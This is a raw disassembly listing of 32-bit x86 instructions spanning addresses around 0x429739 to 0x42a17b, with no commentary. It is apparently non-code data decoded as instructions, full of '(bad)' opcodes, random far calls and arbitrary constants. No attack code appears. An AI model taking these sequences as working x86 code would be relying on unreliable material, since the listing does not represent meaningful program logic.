  429739:	xchg   esi,eax
  42973a:	pop    ds
  42973b:	push   ds
  42973c:	push   esp
  42973d:	aam    0x81
  42973f:	adc    eax,0xac3a0e4a
  429744:	call   0x837:0xd36d147d
  42974b:	(bad)  
  42974c:	icebp  
  42974d:	bsf    ebp,DWORD PTR [esi+0x1e]
  429751:	cld    
  429752:	fdiv   QWORD PTR [esi-0x11aa1896]
  429758:	mov    eax,0x27b00601
  42975d:	clc    
  42975e:	iret   
  42975f:	sbb    BYTE PTR [edx+0x76178855],cl
  429765:	hlt    
  429766:	jmp    0x89dd:0xe224759a
  42976d:	call   0xc58c:0xdc616cf6
  429774:	mov    ch,BYTE PTR [edx+0x55b1fa67]
  42977a:	rcl    DWORD PTR [esp+edi*1],cl
  42977d:	repz mov edi,0x1d646c6e
  429783:	push   ebx
  429784:	xor    esi,DWORD PTR [ebp+eiz*2-0x239d0d0e]
  42978b:	or     eax,0x9f827de2
  429790:	jnp    0x429753
  429792:	sub    al,0x4e
  429794:	or     DWORD PTR [esp+ebx*2-0x36],ebp
  429798:	sbb    BYTE PTR [esi],dh
  42979a:	pop    esi
  42979b:	or     cl,BYTE PTR [edi+0x1c]
  42979e:	ins    DWORD PTR es:[edi],dx
  42979f:	fistp  DWORD PTR [edx-0x4b57e914]
  4297a5:	mov    WORD PTR [eax-0x56e03b3],ss
  4297ab:	cdq    
  4297ac:	sbb    dl,BYTE PTR [edx]
  4297ae:	mov    ah,0x40
  4297b0:	jns    0x4297e7
  4297b2:	sub    BYTE PTR [ebx-0x4c],al
  4297b5:	pop    esp
  4297b6:	mov    edi,0x1ae0dde7
  4297bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297bc:	dec    ebx
  4297bd:	or     al,0xab
  4297bf:	rcr    DWORD PTR [eax],1
  4297c1:	es js  0x4297dd
  4297c4:	sub    al,0xba
  4297c6:	xlat   BYTE PTR ds:[ebx]
  4297c7:	fucom  st(4)
  4297c9:	mov    eax,ds:0x49e0c86f
  4297ce:	aam    0xc0
  4297d0:	cmp    eax,0xcbbd9ad3
  4297d5:	sbb    ebp,DWORD PTR [ebp-0x6c]
  4297d8:	xor    al,0xc8
  4297da:	add    al,0xd1
  4297dc:	lods   al,BYTE PTR ds:[esi]
  4297dd:	jnp    0x429787
  4297df:	push   0xc254c506
  4297e4:	adc    DWORD PTR [edx-0x39a42cb8],esi
  4297ea:	cmp    DWORD PTR [ebx],edi
  4297ec:	nop
  4297ed:	dec    ebx
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	rcr    bl,0xf2
  429865:	cmp    esp,DWORD PTR [edi-0x43]
  429868:	add    DWORD PTR [eax],eax
  42986a:	add    BYTE PTR [ecx],al
  42986c:	add    BYTE PTR [eax],al
  42986e:	mov    bh,ah
  429870:	das    
  429871:	xor    eax,0x49b8f2a4
  429876:	dec    edx
  429877:	inc    edi
  429878:	cmp    ebx,DWORD PTR [ecx+0x6a64e729]
  42987e:	mov    bl,0x9c
  429880:	shr    bl,0x8e
  429883:	pop    ebx
  429884:	adc    eax,0x2a8c8b47
  429889:	pop    edx
  42988a:	or     al,0xbd
  42988c:	(bad)  
  42988d:	pop    eax
  42988e:	rcl    DWORD PTR [eax-0x28],cl
  429891:	lods   eax,DWORD PTR ds:[esi]
  429892:	sbb    bh,cl
  429894:	stos   DWORD PTR es:[edi],eax
  429895:	pop    ebx
  429896:	and    al,0x8f
  429898:	mov    edx,0x363ec734
  42989d:	(bad)  
  42989e:	leave  
  42989f:	dec    edi
  4298a0:	je     0x4298dc
  4298a2:	mov    eax,0xe31384e7
  4298a7:	xchg   edx,eax
  4298a8:	call   0xa18a8f93
  4298ad:	adc    dh,BYTE PTR [ebx+0x9215289]
  4298b3:	cmp    dl,cl
  4298b5:	retf   
  4298b6:	pop    ebp
  4298b7:	into   
  4298b8:	inc    edx
  4298b9:	popa   
  4298ba:	inc    edx
  4298bb:	hlt    
  4298bc:	add    edx,ecx
  4298be:	fnsave [ebp-0x22]
  4298c1:	jmp    0x52b:0x33fe87a9
  4298c8:	or     al,0xc6
  4298ca:	pop    eax
  4298cb:	mov    bh,0x8e
  4298cd:	loope  0x4298d2
  4298cf:	nop
  4298d0:	mov    DWORD PTR [edi+0x7],esi
  4298d3:	inc    edx
  4298d4:	xor    dl,al
  4298d6:	fidiv  DWORD PTR [edi-0x210305e2]
  4298dc:	add    eax,0x884df5e6
  4298e1:	mov    ebx,0x82bdfb00
  4298e6:	mov    edx,0xd04af475
  4298eb:	mov    ebx,0x984576d0
  4298f0:	repnz std 
  4298f2:	mov    dh,0x2f
  4298f4:	push   ds
  4298f5:	test   DWORD PTR [edi+0x4b],eax
  4298f8:	stc    
  4298f9:	aad    0x50
  4298fb:	pop    esp
  4298fc:	push   0x10
  4298fe:	xchg   ecx,eax
  4298ff:	mov    eax,ds:0x7cbd0a9
  429904:	push   esp
  429905:	aas    
  429906:	loop   0x4298c3
  429908:	div    DWORD PTR [eax]
  42990a:	(bad)  
  42990b:	jmp    0x429894
  42990d:	push   edi
  42990e:	xchg   esp,eax
  429910:	sub    eax,0x1f
  429913:	imul   edx,DWORD PTR [edi],0xffffffbc
  429916:	dec    eax
  429917:	inc    ecx
  429918:	push   edi
  429919:	sbb    DWORD PTR [eax+0x32],0xc57d86ce
  429920:	gs out dx,al
  429922:	mov    esi,0xfaee9410
  429927:	jg     0x4298da
  429929:	dec    edx
  42992a:	push   0x8abcdf54
  42992f:	dec    esp
  429930:	aam    0xf6
  429932:	stc    
  429933:	sahf   
  429934:	cmp    bl,bl
  429936:	not    BYTE PTR [edx]
  429938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429939:	ret    0x8155
  42993c:	jecxz  0x429998
  42993e:	cmp    eax,ebp
  429940:	lahf   
  429941:	pusha  
  429942:	and    DWORD PTR [ebp+0x7ecf3f6a],ebp
  429948:	and    DWORD PTR [ebp-0x70],0xab4eca24
  42994f:	mov    dl,0x4a
  429951:	aad    0x34
  429953:	call   0x190e:0x78098f54
  42995a:	inc    ebx
  42995b:	xor    esp,DWORD PTR [esi+ecx*4+0x7f95178a]
  429962:	xor    ebp,DWORD PTR [edx]
  429964:	jb     0x4298ea
  429966:	add    BYTE PTR [esi-0x46],cl
  429969:	iret   
  42996a:	xlat   BYTE PTR ds:[ebx]
  42996b:	popf   
  42996c:	inc    esp
  42996d:	aad    0x0
	...
  4299d3:	add    BYTE PTR [eax],al
  4299d5:	add    BYTE PTR [edi+0x68],dl
  4299d8:	fistp  QWORD PTR fs:[edi-0x21]
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	dec    edx
  4299e3:	mov    ebp,0xbe6744fd
  4299e8:	add    DWORD PTR [eax],eax
  4299ea:	add    BYTE PTR [ecx],al
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	dec    ecx
  4299ef:	out    dx,al
  4299f0:	neg    bl
  4299f2:	sbb    BYTE PTR [edi],0x77
  4299f5:	mov    DWORD PTR [esi*8-0x1e97aecb],eax
  4299fc:	fs jns 0x429a4d
  4299ff:	shl    ebx,0x47
  429a02:	pop    eax
  429a03:	sub    esi,DWORD PTR [eax+eiz*1]
  429a06:	jg     0x4299cf
  429a08:	sub    BYTE PTR [edi],dl
  429a0a:	adc    eax,0x730cbd08
  429a0f:	sub    eax,0x5e6c049
  429a14:	rcr    BYTE PTR [edi],0xe4
  429a17:	pop    esp
  429a18:	fimul  DWORD PTR [bx+di+0x3c93]
  429a1d:	mov    DWORD PTR [eax+0x56f0ba57],esi
  429a23:	mov    esi,DWORD PTR [ecx-0x22c4f28]
  429a29:	mov    cl,0xbc
  429a2b:	hlt    
  429a2c:	pop    es
  429a2d:	call   0x3b08:0x27c1d473
  429a34:	xchg   ebp,eax
  429a35:	imul   esp,DWORD PTR [ecx],0x5d2f7b83
  429a3b:	and    BYTE PTR [eax-0x19fdb466],dh
  429a41:	mov    cl,0xa2
  429a43:	iret   
  429a44:	xchg   BYTE PTR [esi+0x6947209d],bh
  429a4a:	pop    edi
  429a4b:	les    eax,FWORD PTR [ebx+0x2bbca9]
  429a51:	call   0xe3fb:0xd445e233
  429a58:	xlat   BYTE PTR ds:[ebx]
  429a59:	dec    esi
  429a5a:	adc    al,0xfc
  429a5c:	fwait
  429a5d:	or     al,BYTE PTR [edx+0x28ee502c]
  429a63:	xor    eax,0xa7f01e3
  429a68:	not    esi
  429a6a:	pushf  
  429a6b:	dec    esi
  429a6c:	xchg   DWORD PTR [ebp-0xa],eax
  429a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a71:	mov    al,ds:0x8967a59b
  429a76:	jb     0x429a73
  429a78:	inc    ebp
  429a79:	cdq    
  429a7a:	daa    
  429a7b:	xchg   BYTE PTR [ebp-0x2d],ch
  429a7e:	rcl    BYTE PTR [eax],cl
  429a80:	inc    esp
  429a81:	add    dh,BYTE PTR [edx]
  429a83:	jecxz  0x429ac4
  429a85:	leave  
  429a86:	pop    es
  429a87:	addr16 out 0xc5,eax
  429a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a8b:	fadd   DWORD PTR [ebx]
  429a8d:	xlat   BYTE PTR ds:[ebx]
  429a8e:	pop    ss
  429a8f:	out    0x33,eax
  429a91:	push   edx
  429a92:	cmp    DWORD PTR [edi-0x4],ebx
  429a95:	pop    edx
  429a96:	xor    al,0x38
  429a98:	mov    WORD PTR [eax+0x13e23d7e],?
  429a9e:	and    al,0x68
  429aa0:	jb     0x429b05
  429aa2:	or     ebx,DWORD PTR [eax]
  429aa4:	push   ebp
  429aa5:	bound  ebp,QWORD PTR [edi-0x117d2145]
  429aab:	in     al,dx
  429aac:	or     al,0x63
  429aae:	scas   eax,DWORD PTR es:[edi]
  429aaf:	cdq    
  429ab0:	fistp  QWORD PTR [ecx+0x27f5446a]
  429ab6:	add    ebx,DWORD PTR [eax+0x8]
  429ab9:	inc    ebp
  429aba:	jge    0x429ada
  429abc:	lods   al,BYTE PTR ds:[esi]
  429abd:	mov    esi,0xc97d2641
  429ac2:	mov    WORD PTR [edi-0x1bef2d5f],ss
  429ac8:	enter  0x2776,0x83
  429acc:	nop
  429acd:	mov    ch,BYTE PTR [edx+0x6f0bfe7b]
  429ad3:	jecxz  0x429b29
  429ad5:	mov    esi,0xe2821fc1
  429ada:	cld    
  429adb:	das    
  429adc:	mov    al,0xb1
  429ade:	or     eax,DWORD PTR [eax+ebp*1+0x62]
  429ae2:	mov    BYTE PTR [ebx-0x65369742],dl
  429ae8:	sbb    esi,DWORD PTR ds:0x165f5f25
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x70a95667
  429b63:	out    dx,eax
  429b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b65:	fs addr16 mov edi,0x1000001
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	push   ss
  429b6f:	or     cl,BYTE PTR [eax]
  429b71:	lea    esp,[eax+0x20]
  429b74:	(bad)  
  429b76:	mov    edi,edi
  429b78:	push   ds
  429b79:	jnp    0x429b4b
  429b7b:	call   0x1956:0xc4c0e858
  429b82:	inc    edi
  429b83:	addr16 popf 
  429b85:	sub    DWORD PTR [edx],0xfffffff4
  429b88:	gs add eax,0x601d1c34
  429b8e:	dec    eax
  429b8f:	icebp  
  429b90:	add    BYTE PTR [edx],dl
  429b92:	leave  
  429b93:	data16 jmp 0x429bd8
  429b96:	jmp    0x429b99
  429b98:	into   
  429b99:	pop    ebp
  429b9a:	sbb    DWORD PTR [ecx+edi*1],ebp
  429b9d:	jns    0x429b4e
  429b9f:	jle    0x429b4c
  429ba1:	outs   dx,BYTE PTR ds:[esi]
  429ba2:	jbe    0x429b9d
  429ba4:	and    eax,0x5f144e8b
  429ba9:	xchg   ebx,eax
  429baa:	cdq    
  429bab:	out    0x4d,eax
  429bad:	jge    0x429b3e
  429baf:	mov    esi,0x815da678
  429bb4:	inc    ebp
  429bb5:	dec    ebp
  429bb6:	fdivr  st,st(4)
  429bb8:	mov    edx,0x7fb95cd9
  429bbd:	pop    esp
  429bbe:	(bad)  
  429bbf:	dec    eax
  429bc0:	aam    0x2
  429bc2:	mov    cl,0xda
  429bc4:	stos   BYTE PTR es:[edi],al
  429bc5:	add    BYTE PTR ds:0x20fd38aa,cl
  429bcb:	sub    BYTE PTR [edx+0x43e3ac28],ah
  429bd1:	aam    0x57
  429bd3:	outs   dx,BYTE PTR ds:[esi]
  429bd4:	and    eax,0x51b3814c
  429bd9:	repz push cs
  429bdb:	inc    ebp
  429bdc:	fcmovnu st,st(7)
  429bde:	sbb    edi,ebp
  429be0:	mov    ds:0x722dc936,eax
  429be5:	outs   dx,DWORD PTR ds:[esi]
  429be6:	dec    edx
  429be7:	sub    al,BYTE PTR [eax]
  429be9:	push   DWORD PTR [esi+ebx*8]
  429bec:	lods   eax,DWORD PTR ds:[esi]
  429bed:	sbb    ch,BYTE PTR [ebx-0x5c200b5f]
  429bf3:	xchg   edi,eax
  429bf4:	fwait
  429bf5:	mov    eax,0x1cb4b8ac
  429bfa:	xchg   ebp,eax
  429bfb:	xchg   edx,eax
  429bfc:	jns    0x429bc7
  429bfe:	(bad)  
  429bff:	push   ebp
  429c00:	mov    ecx,0xf717028c
  429c05:	xor    dl,BYTE PTR [ebp+0x275f67e1]
  429c0b:	or     ebp,DWORD PTR [edi+eiz*4]
  429c0e:	rcr    ch,1
  429c10:	fsubr  DWORD PTR [edi-0x77]
  429c13:	xchg   ecx,eax
  429c14:	repnz dec edi
  429c16:	out    0x5f,al
  429c18:	lods   al,BYTE PTR ds:[esi]
  429c19:	inc    edx
  429c1a:	jmp    0x429c1f
  429c1c:	jle    0x429c50
  429c1e:	imul   ecx,DWORD PTR [ebp-0x59bfd63c],0x968af9a2
  429c28:	icebp  
  429c29:	xchg   ebx,eax
  429c2a:	in     al,0x2e
  429c2c:	jne    0x429c15
  429c2e:	in     al,dx
  429c2f:	(bad)  
  429c30:	adc    esi,DWORD PTR [eax]
  429c32:	sbb    bl,BYTE PTR [esi]
  429c34:	call   0x57eadf47
  429c39:	dec    esp
  429c3a:	push   es
  429c3b:	lahf   
  429c3c:	sub    eax,ebp
  429c3e:	(bad)  
  429c3f:	hlt    
  429c40:	xchg   ebx,eax
  429c41:	jo     0x429c01
  429c43:	add    eax,0x954b6f63
  429c48:	mov    bh,0x76
  429c4a:	stc    
  429c4b:	daa    
  429c4c:	cmp    al,0x5a
  429c4e:	mov    bl,0x1c
  429c50:	sub    esp,DWORD PTR [esi]
  429c52:	fwait
  429c53:	sbb    eax,0x388bbdd5
  429c58:	and    al,0xd8
  429c5a:	sbb    DWORD PTR [ecx-0x3d],ebp
  429c5d:	push   ecx
  429c5e:	xchg   esi,eax
  429c5f:	popf   
  429c60:	cli    
  429c61:	gs in  eax,0xff
  429c64:	or     eax,DWORD PTR [ecx]
  429c66:	sub    eax,0x580b5681
  429c6b:	imul   edx,esp,0x98
	...
  429cd5:	add    BYTE PTR [ebx-0x487759ea],ah
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    al,dl
  429ce3:	shl    DWORD PTR [eax+0x1c067a4],cl
  429ce9:	add    BYTE PTR [eax],al
  429ceb:	add    DWORD PTR [eax],eax
  429ced:	add    BYTE PTR [edi+0x3f6af04b],dh
  429cf3:	xchg   esi,eax
  429cf4:	mov    ds,ecx
  429cf6:	sbb    ch,BYTE PTR [edi*8+0x4299aa10]
  429cfd:	cmp    eax,0x5ed3f9b8
  429d02:	or     eax,0xc952432b
  429d07:	mov    es,WORD PTR [edi+0x527b39de]
  429d0d:	fsub   st,st(0)
  429d0f:	test   al,0xfa
  429d11:	adc    DWORD PTR [ecx-0x1a8ece77],ebx
  429d17:	add    BYTE PTR [ebx-0x5f],dl
  429d1a:	push   edx
  429d1b:	cmp    eax,0xd3d9f8b1
  429d20:	jp     0x429d31
  429d22:	cdq    
  429d23:	push   ds
  429d24:	shl    BYTE PTR [eax],1
  429d26:	inc    ecx
  429d27:	and    al,0x97
  429d29:	lods   al,BYTE PTR ds:[esi]
  429d2a:	push   esi
  429d2b:	push   esi
  429d2c:	cwde   
  429d2d:	mov    dl,0xe3
  429d2f:	pop    esp
  429d30:	in     eax,dx
  429d31:	in     al,0x45
  429d33:	pop    edx
  429d34:	push   ebx
  429d35:	ret    0x54bc
  429d38:	cmp    al,0x71
  429d3a:	jnp    0x429d9c
  429d3c:	mov    eax,0xf8d52acc
  429d41:	cmp    BYTE PTR [esi],ch
  429d43:	add    DWORD PTR [ebx+0x77f7dd38],edi
  429d49:	cld    
  429d4a:	inc    edi
  429d4b:	or     al,0xea
  429d4d:	das    
  429d4e:	push   ecx
  429d4f:	xor    edi,DWORD PTR ds:0x7510d921
  429d55:	sub    al,0x88
  429d57:	(bad)  
  429d58:	loopne 0x429cf2
  429d5a:	ja     0x429d89
  429d5c:	ins    DWORD PTR es:[edi],dx
  429d5d:	add    al,0x39
  429d5f:	inc    esi
  429d60:	stos   DWORD PTR es:[edi],eax
  429d61:	mov    DWORD PTR [edi+eiz*2-0x5],ebx
  429d65:	push   0x28
  429d67:	loopne 0x429d3c
  429d69:	rcl    esi,0xf7
  429d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d6d:	inc    eax
  429d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d6f:	cli    
  429d70:	adc    eax,0xcbf290b6
  429d75:	push   ss
  429d76:	and    DWORD PTR [esi-0x5bf57416],esp
  429d7c:	jae    0x429de8
  429d7e:	and    dl,dl
  429d80:	in     eax,dx
  429d81:	xchg   BYTE PTR [ebp+0x797e9451],ah
  429d87:	test   BYTE PTR [ebx],cl
  429d89:	and    bl,BYTE PTR [ecx+eax*4+0x34]
  429d8d:	ds ja  0x429df2
  429d90:	and    DWORD PTR [ebx-0x248ce8a],0xffffff96
  429d97:	adc    BYTE PTR [ecx],0xee
  429d9a:	add    al,0x3e
  429d9c:	test   eax,0x19a3ade3
  429da1:	and    dh,BYTE PTR [eax]
  429da3:	sub    cl,BYTE PTR [ecx]
  429da5:	into   
  429da6:	or     BYTE PTR [edi-0x3d],cl
  429da9:	xchg   BYTE PTR [edi-0x61d171fe],ch
  429daf:	cmp    eax,esi
  429db1:	mov    al,ds:0x7be3ec82
  429db6:	fsub   DWORD PTR [edx-0x1e]
  429db9:	xchg   ecx,eax
  429dba:	test   al,0xfc
  429dbc:	cli    
  429dbd:	or     al,0xc6
  429dbf:	fdivrp st(7),st
  429dc1:	or     BYTE PTR [edx],cl
  429dc3:	mov    esp,0xbaa0c16d
  429dc8:	stos   DWORD PTR es:[edi],eax
  429dc9:	popa   
  429dca:	sbb    eax,0xe6ae562f
  429dcf:	push   edx
  429dd0:	cmp    cl,bh
  429dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429dd3:	mov    ch,0xe3
  429dd5:	je     0x429dd8
  429dd7:	inc    edx
  429dd8:	pusha  
  429dd9:	sub    eax,0xaf81b629
  429dde:	jno    0x429e3f
  429de0:	xchg   edi,eax
  429de1:	mov    eax,0x6e0ab94d
  429de6:	in     al,0x8d
  429de8:	push   ss
  429de9:	jle    0x429ddc
  429deb:	and    al,0xaa
  429ded:	xchg   ebx,eax
	...
  429e56:	fwait
  429e57:	mov    bh,0xc4
  429e59:	or     al,0xec
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	ja     0x429e91
  429e64:	add    BYTE PTR [edi+0x1c167],dl
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	daa    
  429e6f:	push   ecx
  429e70:	shr    esi,0xa3
  429e73:	cmp    ch,BYTE PTR [ecx]
  429e75:	cs inc edi
  429e77:	cmp    eax,0xbb2ae1a1
  429e7c:	cli    
  429e7d:	sub    DWORD PTR ds:0x3180cc00,edx
  429e83:	jno    0x429e7a
  429e85:	popf   
  429e86:	lods   al,BYTE PTR ds:[esi]
  429e87:	jb     0x429edb
  429e89:	dec    esi
  429e8a:	or     DWORD PTR [eax+ebx*1],eax
  429e8d:	xlat   BYTE PTR ds:[ebx]
  429e8e:	adc    BYTE PTR [eax],cl
  429e90:	ss repz add al,0xe4
  429e94:	and    edx,0x73d7b30b
  429e9a:	push   edi
  429e9b:	dec    bh
  429e9d:	das    
  429e9e:	ds sbb eax,0x4b1fe932
  429ea4:	enter  0x857b,0xf7
  429ea8:	stos   BYTE PTR es:[edi],al
  429ea9:	je     0x429e44
  429eab:	lahf   
  429eac:	push   ds
  429ead:	mov    ah,0xe6
  429eaf:	aad    0xe4
  429eb1:	sub    DWORD PTR [esi-0x4a],esp
  429eb4:	hlt    
  429eb5:	sbb    bl,BYTE PTR [edi-0x67336be5]
  429ebb:	sbb    eax,0x7b730517
  429ec0:	pop    es
  429ec1:	dec    ecx
  429ec2:	mov    bh,0xf3
  429ec4:	or     al,BYTE PTR [esi-0x61079785]
  429eca:	mov    cs,edi
  429ecc:	leave  
  429ecd:	cmp    BYTE PTR ds:0xb0e46e3b,0xaa
  429ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ed5:	and    edx,DWORD PTR [edx+0x48]
  429ed8:	aas    
  429ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429eda:	shl    BYTE PTR [ebx+0x43],1
  429edd:	(bad)  
  429ede:	cli    
  429edf:	dec    edx
  429ee0:	popf   
  429ee1:	pop    es
  429ee2:	pop    ebp
  429ee3:	mov    eax,ds:0x4d90f35f
  429ee8:	inc    edx
  429ee9:	lea    eax,ds:0x8b69efe0
  429eef:	dec    esi
  429ef0:	imul   esp,DWORD PTR [esi],0x779e299c
  429ef6:	pop    esp
  429ef7:	xchg   esp,eax
  429ef8:	mov    cl,0x5
  429efa:	cli    
  429efb:	iret   
  429efc:	dec    ebp
  429efd:	pop    esi
  429efe:	xchg   esp,eax
  429eff:	or     al,0x27
  429f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f02:	ficomp DWORD PTR [ebp+0x2a]
  429f05:	(bad)  
  429f06:	adc    eax,0x8d4402a2
  429f0b:	imul   dl
  429f0d:	clc    
  429f0e:	(bad)  
  429f0f:	aas    
  429f10:	ror    edx,cl
  429f12:	xlat   BYTE PTR ds:[ebx]
  429f13:	pop    ss
  429f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f15:	stc    
  429f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f17:	repnz shr DWORD PTR [edi+0x5dd6ae92],1
  429f1e:	lods   eax,DWORD PTR ds:[esi]
  429f1f:	mov    dl,0x4c
  429f21:	call   0x80b94505
  429f26:	mov    eax,ds:0x67e4bcf6
  429f2b:	lods   al,BYTE PTR ds:[esi]
  429f2c:	or     eax,0x83018af0
  429f31:	and    DWORD PTR [edx],edi
  429f33:	inc    ebx
  429f34:	mov    al,0xa7
  429f36:	or     DWORD PTR [eax+0x1c],eax
  429f39:	sti    
  429f3a:	mov    ds:0x789a2440,eax
  429f3f:	fild   WORD PTR [ebp+eiz*2+0x7af09a5f]
  429f46:	sub    eax,0xad4dbc0c
  429f4b:	xor    BYTE PTR [ebx-0x4169f069],bh
  429f51:	in     al,dx
  429f52:	sbb    BYTE PTR [edx+edx*2],bl
  429f55:	jae    0x429f79
  429f57:	mov    eax,0x37427bb
  429f5c:	jmp    0x429f28
  429f5e:	ds mov esp,0xfd51d262
  429f64:	dec    edi
  429f65:	sti    
  429f66:	scas   al,BYTE PTR es:[edi]
  429f67:	hlt    
  429f68:	sub    al,0xa
  429f6a:	jb     0x429f96
  429f6c:	ins    BYTE PTR es:[edi],dx
  429f6d:	retf   0x0
	...
  429fd4:	add    BYTE PTR [eax],al
  429fd6:	xor    DWORD PTR [ebp-0x38],eax
  429fd9:	push   es
  429fda:	cld    
  429fdb:	(bad)  
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x766d7653]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	daa    
  429fef:	out    dx,al
  429ff0:	cwde   
  429ff1:	cmp    al,0x59
  429ff3:	pop    es
  429ff4:	mov    ecx,0x93f7ffa2
  429ff9:	popa   
  429ffa:	xor    al,0xb4
  429ffc:	mov    bl,0xd6
  429ffe:	js     0x429f85
  42a000:	das    
  42a001:	shl    al,1
  42a003:	test   BYTE PTR [ebx-0x2c],bh
  42a006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a008:	jle    0x429fb3
  42a00a:	in     al,dx
  42a00b:	shr    DWORD PTR [ebx+0x4606a33e],1
  42a011:	lds    edx,FWORD PTR [ebx-0xe]
  42a014:	push   ss
  42a015:	fld    QWORD PTR [esi-0x64]
  42a018:	ret    0x78a8
  42a01b:	stos   DWORD PTR es:[edi],eax
  42a01c:	jg     0x42a035
  42a01e:	mov    ch,0x16
  42a020:	push   edi
  42a021:	in     al,dx
  42a022:	fwait
  42a023:	outs   dx,BYTE PTR ds:[esi]
  42a024:	mov    eax,0xffcfaa18
  42a029:	popf   
  42a02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a02b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a02c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a02d:	and    al,0x24
  42a02f:	leave  
  42a030:	or     eax,0x6b686cc0
  42a035:	cmp    ebp,DWORD PTR [edi-0x2f]
  42a038:	mov    ah,BYTE PTR [eax]
  42a03a:	cmp    esi,esi
  42a03c:	adc    dl,ah
  42a03e:	loopne 0x42a048
  42a040:	lods   eax,DWORD PTR ds:[esi]
  42a041:	add    bh,cl
  42a043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a044:	(bad)  
  42a045:	and    al,0x1f
  42a047:	add    DWORD PTR [ebx+0x6ae8aa9d],esp
  42a04d:	sub    esi,DWORD PTR [ebp-0x63c7be75]
  42a053:	shl    DWORD PTR [ebx-0x12],1
  42a056:	inc    esi
  42a057:	sbb    dh,bl
  42a059:	arpl   WORD PTR [ecx-0x33],si
  42a05c:	jmp    0x4ee0:0xe2a5fe38
  42a063:	mov    bh,0xc0
  42a065:	and    dh,cl
  42a067:	dec    esp
  42a068:	push   es
  42a069:	outs   dx,DWORD PTR ds:[esi]
  42a06a:	fidiv  DWORD PTR [edx+0x2f]
  42a06d:	mov    ss:0x767a8f9b,eax
  42a073:	(bad)  
  42a074:	mov    dh,0x4f
  42a076:	jg     0x429fff
  42a078:	aaa    
  42a079:	and    dh,ch
  42a07b:	adc    ah,0xf
  42a07e:	rcl    BYTE PTR [ecx-0x587acad9],cl
  42a084:	stc    
  42a085:	mov    dh,0x7b
  42a087:	jmp    0x42a07d
  42a089:	cmp    cl,dl
  42a08b:	data16 js 0x42a070
  42a08e:	cs mov dl,0x2b
  42a091:	aas    
  42a092:	or     al,0xbd
  42a094:	cmpps  xmm5,XMMWORD PTR [edx+0x404639f],0x69
  42a09c:	mov    dl,BYTE PTR [edi-0x57]
  42a09f:	pop    edi
  42a0a0:	shl    DWORD PTR [ecx+0x1feb2b17],cl
  42a0a6:	push   esp
  42a0a7:	pop    esi
  42a0a8:	cmp    edx,edx
  42a0aa:	rol    DWORD PTR ds:0xd41466a,cl
  42a0b0:	popf   
  42a0b1:	xor    DWORD PTR [ebp+0x142ab859],edx
  42a0b7:	fwait
  42a0b8:	pop    edx
  42a0b9:	jae    0x42a10e
  42a0bb:	es pop ecx
  42a0bd:	mov    edi,0x999244b0
  42a0c2:	xor    DWORD PTR [edi],esp
  42a0c4:	adc    ch,0xc3
  42a0c7:	cmp    edi,edi
  42a0c9:	mov    bh,0x49
  42a0cb:	or     bh,BYTE PTR ds:0xd9a36fc9
  42a0d1:	pop    eax
  42a0d2:	fdiv   QWORD PTR [eax+0x7a148cb9]
  42a0d8:	mov    dl,BYTE PTR [edx]
  42a0da:	or     ch,BYTE PTR [ebp-0x43]
  42a0dd:	mov    dl,0x68
  42a0df:	and    al,0xdd
  42a0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a0e2:	ins    DWORD PTR es:[edi],dx
  42a0e3:	cwde   
  42a0e4:	dec    ecx
  42a0e5:	popa   
  42a0e6:	cwde   
  42a0e7:	cmp    cl,BYTE PTR [ecx+0x58]
  42a0ea:	fadd   DWORD PTR [ebx*8+0x68]
	...
  42a155:	add    bh,dl
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	push   eax
  42a163:	iret   
  42a164:	and    dh,BYTE PTR [eax+0x1c367]
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a16f:	sub    dl,BYTE PTR [ebx+0x26ab2a12]
  42a175:	xchg   esp,eax
  42a176:	mov    gs,WORD PTR [edi]
  42a178:	pop    ebp
  42a179:	jp     0x42a1e5
  42a17b:	arpl   si,cx
